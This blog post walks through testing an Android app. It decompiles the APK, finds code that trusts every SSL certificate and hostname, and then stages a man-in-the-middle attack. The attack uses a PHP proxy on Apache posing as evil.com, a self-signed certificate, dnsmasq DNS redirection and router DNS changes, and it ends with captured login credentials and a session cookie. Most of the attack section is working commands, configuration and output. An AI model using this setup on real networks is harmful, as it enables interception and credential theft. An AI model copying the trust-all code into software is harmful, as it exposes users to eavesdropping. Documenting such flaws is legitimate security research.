---
published: true
layout: post
---
I chose one application in Google Play to test. Its main functionalities were focused on consuming a RESTful web service. I decompiled this application using tools dex2jar and JD-GUI. Firstly, I connected my phone to computer to get apk file

	$ adb pull /data/app/com.example.app-1.apk

Then I converted apk into jar and ran decompiler

	$ ./d2j-dex2jar.sh com.example.app-1.apk -o app.jar
	dex2jar com.example.app-1.apk -> app.jar

	$ java -jar jd-gui-1.4.0.jar app.jar

During code analysis I found some interesting piece which made me think that application doesn't verify SSL certificate.

	SSLContext sc = SSLContext.getInstance("TLS");
	sc.init(null, new TrustManager[] { new TrustAllX509TrustManager() }, new java.security.SecureRandom());
	HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
	HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier(){
    	public boolean verify(String string,SSLSession ssls) {
        	return true;
    	}
	});
	
	public class TrustAllX509TrustManager implements X509TrustManager {
    	public X509Certificate[] getAcceptedIssuers() {
        	return new X509Certificate[0];
    	}
	
    	public void checkClientTrusted(java.security.cert.X509Certificate[] certs,
        	    String authType) {
    	}
	
    	public void checkServerTrusted(java.security.cert.X509Certificate[] certs,
        	    String authType) {
    	}
	}
    
To prove it, I ran Burp Suite and set up proxy on my phone. It was important not to install Burp's CA certificate. Web browser started to show warning when I was trying to load any page through HTTPS, but my application was connecing to web service without any problems.
I decided to exploit this vulnerability and peform Man-in-the-middle attack by setting up proxy between target's mobile device and web service.

I started with [proxy](https://github.com/mmmds/walkthroughs/blob/master/proxy.php) which I wrote in PHP and ran on Apache. It passes requests to legitimate web service and returns response from it slightly modifying headers to make the whole communication readable. Apache required rewriting rule to redirect every URL to this script and self-signed SSL certificate.

	<VirtualHost *:443>
		ServerName evil.com
		RewriteEngine on
		RewriteCond %{REQUEST_FILENAME} !-d
		RewriteCond %{REQUEST_FILENAME} !-f
		RewriteRule . /proxy.php [L]
		DocumentRoot /var/www/html
		SSLEngine on
		SSLCertificateFile "/tmp/server.cert"
		SSLCertificateKeyFile "/tmp/server.key"
	</VirtualHost>

Certificate was generated by

	$ openssl req -nodes -new -x509 -keyout server.key -out server.cert
    
Next step was to run dnsmasq - DNS server configured to return my proxy's IP for web service domain.

	$ dnsmasq -C /etc/dnsmasq.conf

Configuration consists of two files, /etc/dnsmasq.conf

	addn-hosts=/etc/dnsmasq.hosts
	server=8.8.8.8
    
and /etc/dnsmasq.hosts

	192.0.2.1 example.com
    
The last step was to change router's DNS to set up server's IP in administration panel. From that moment traffic from every device connected to attacker's WiFi was logged.

	$ cat /tmp/traffic
	POST /login HTTP/1.1
	Accept: text/plain, text/plain, application/json, */*, */*
	Content-Type: application/json
    User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; GT-I8160 Build/KTU84Q)
	Host: example.com
	Connection: Keep-Alive
	Content-Length: 53
    
    { "username": "user1", "password": "s3cr3tp4ssw0rd" }
    
    
    HTTP/1.1 200 200
	Server: nginx
	Date: Sat, 25 Feb 2017 20:47:29 GMT
	Content-Type: application/json
	Transfer-Encoding: chunked
	Connection: keep-alive
	Set-Cookie: JSESSIONID=A163B20D3696AF6185C07CD62EBA4B05
